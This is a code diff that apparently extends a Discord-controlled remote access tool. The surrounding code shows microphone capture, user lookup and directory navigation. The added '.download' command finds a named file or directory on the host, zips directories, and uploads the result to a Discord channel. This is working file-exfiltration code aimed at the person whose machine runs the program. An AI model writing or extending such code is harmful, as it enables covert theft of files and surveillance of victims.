@@ -9,6 +9,7 @@ from itertools import islice
 import time
 from getpass import getuser
 import pyaudio
+from zipfile import ZipFile
 import asyncio
 import sounddevice
 from scipy.io.wavfile import write
@@ -209,6 +210,30 @@ async def on_message(message):
 
         elif message.content == '.pwd':
             reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:9] == '.download':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if message.content == '.download':
+                    reaction_msg = await message.channel.send('```Syntax: .download <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
+                else:
+                    if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
+                        target_file = '/'.join(working_directory) + '/' + message.content[10:]
+                        if os.path.isdir(target_file):
+                            target_file += '.zip'
+                            with ZipFile(target_file,'w') as zip:
+                                for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
+                                    zip.write(file)
+
+                        if os.stat(target_file).st_size <= 8388608:
+                            await message.channel.send(file=discord.File(target_file))
+                        else:
+                            print('bigger')
+                    else:
+                        reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
+
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
